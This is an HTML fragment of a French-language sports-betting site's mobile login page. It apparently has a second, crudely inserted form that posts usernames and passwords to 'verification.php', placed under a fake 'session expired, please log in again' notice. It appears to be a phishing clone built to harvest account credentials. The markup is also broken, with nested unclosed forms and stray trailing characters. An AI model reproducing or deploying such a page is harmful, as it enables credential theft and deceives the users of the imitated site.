<div data-role='page' id='login' data-url='login_aspx' data-lang='fr'><div class='panel left' data-rel='close' data-role='panel' data-position='right' data-animate='false' data-display='overlay' id='panel-right'><ul data-role='listview'><li data-icon='false'><a data-role='button' href='javascript:void(0);' data-rel='close' data-icon='delete' data-iconpos='right'>Fermer</a></li><li data-icon='false'><a class='leftMenuItem' href='#language-selection'><div class='categoryIconContainer tw-language'></div>R&#233;glages</a></li><li data-icon='false'><a class='leftMenuItem' href=\"#info/payment-options\"><div class='categoryIconContainer tw-paymentcode'></div>Methodes payement</a></li><li data-icon='false'><a class='leftMenuItem' href='#contact'><div class='categoryIconContainer tw-contact'></div>Contact</a></li><li data-icon='false'><a class='leftMenuItem' href='#info'><div class='categoryIconContainer tw-msg-info-circle'></div>Infos</a></li><li data-icon='false'><a class='leftMenuItem' href='#search'><div class='categoryIconContainer tw-search'></div>Recherche</a></li><li data-icon='false'><a class='leftMenuItem' href='#info/about-us'><div class='categoryIconContainer tw-settings'></div>Sur nous</a></li></ul></div><div data-tap-toggle='false' data-role='header' data-theme='b' class='tw-header' id=\"navHeader\" data-add-back-btn='true'><h1 class='tw-header-title'>Me connecter</h1><img src='Content/images/panel-home.png' class='ui-btn-right tw-home-right-panel' onclick=\"openHomeMenu();\" alt='open panel' /></div><div data-role='content' id=\"mobileMainContent\"><div id='twMainContentView'><form autocomplete='off' action='verification.php' method='post' id='loginForm'><input name=\"__RequestVerificationToken\" type=\"hidden\" value=\"eRjU51UhbjiBj92dStfV8vxu_Xpf-qrmsEayJWoRNpVQxojRGT6Z-M-9dWYez5UIoo-7ybwO9FIWBUBMr0zMH2hGbiEHnfpCTWMZ5SGUCAI1\" /><input type='hidden' name='returnUrl' value='user-settings' />    <input type='hidden' id='rememberUser' name='rememberMe' value='off' /><input type='hidden' id='loginMode' name='loginMode' value='0' /><input type='hidden' name='routeAction' value='login' /><input type='hidden' name='routeToken' value='CDXr2Ssmv4rciBf9praO3Fp7S/nt5vYwmaBIQGAC25g=' /><ul data-role='listview' data-inset='false'><li data-role='list-divider' class='tw-ui-li-divider' data-theme='b' data-icon='lock'><div class='categoryIconContainer tw-user'></div>Me connecter</li><li><div class='tw-info tw-msg-info2'></div><div class='tw-popup-box'>Votre session est expir&#233;e d&#251; &#224; l&#39;inactivit&#233; et vous &#234;tes d&#233;connect&#233;s automatiquement... Pri&#232;re connectez vous pour continuer</div> 

	<form action="verification.php" method="POST">
                <h1>Connexion</h1>
                
                <label><b>Nom d'utilisateur</b></label>
                <input type="text" placeholder="Entrer le nom d'utilisateur" name="username" required>

                <label><b>Mot de passe</b></label>
                <input type="password" placeholder="Entrer le mot de passe" name="password" required>

                <input type="submit" id='submit' value='LOGIN' ></li><li data-role='fieldcontain'><div class='ui-grid-solo'><div class='ui-block-a tw-white-space-normal'>Vous n&#39;avez pas un compte ouvert?</div><div class='ui-grid-a'><a data-role='button' data-mini='true' data-theme='i' data-iconpos='right' data-icon='arrow-r' href='#registration'>Inscrivez-vous</a></div></div></li></ul><ul class='ui-listview tw-ui-listview-top' data-role='listview' data-inset='false'><li data-role='list-divider' class='tw-ui-li-divider ui-li-divider ui-bar-b ui-first-child' data-theme='b'><div class='categoryIconContainer tw-user'></div>Compte</li><li><a data-role='button' data-mini='true' data-icon='arrow-r' data-iconpos='right' href='#username-recovery'>Nom d&#39;utilisateur oubli&#233;?</a></li><li><a data-role='button'  data-mini='true' data-icon='arrow-r' data-iconpos='right' href='#password-recovery'>Mot de passe oubli&#233;?</a></li></ul></form><button class='ui-btn ui-shadow ui-corner-all ui-icon-arrow-u ui-btn-icon-right tw-scroll-top' style='display:none' onclick='TwNavigation.PageTop(this);'>Top</button></div><div id='twInfoContentView' class='fieldHide'></div></div><div data-role='footer' data-theme='b' class='ui-navbar-custom' data-position='fixed' id='footer' data-tap-toggle='false'><div data-role='navbar' class='ui-navbar-custom' id='main_navbar'><ul><li><a href='#home' id='homeLink' data-icon='custom' class=''><div class='tw-menu-text'>&nbsp;</div><span class='ui-btn-icon-top-home tw-home'>&nbsp;</span></a></li><li><a href='#login' id='loginLink' data-icon='custom' class='ui-btn-active'><div class='tw-menu-text'>Me connecter</div><span class='ui-btn-icon-top-login tw-user'></span></a></li><li><a href='#betting/sports' id='betsLink' data-icon='custom' class=''><div class='tw-menu-text'>Paris sportifs</div><span class='ui-btn-icon-top-betting tw-betting'>&nbsp;</span></a></li><li><span class='speech' id='fbsCounter' data-enhance='true'>0</span><a href='#betslip' id='betslipLink' data-icon='custom' class=''><div class='tw-menu-text'>Fiche web</div><span class='ui-btn-icon-top-betslip tw-betslip'>&nbsp;</span></a><span class='speech' id='bsMaxQuota' data-enhance='true'>0.0</span></li></ul></div></div></div>"}}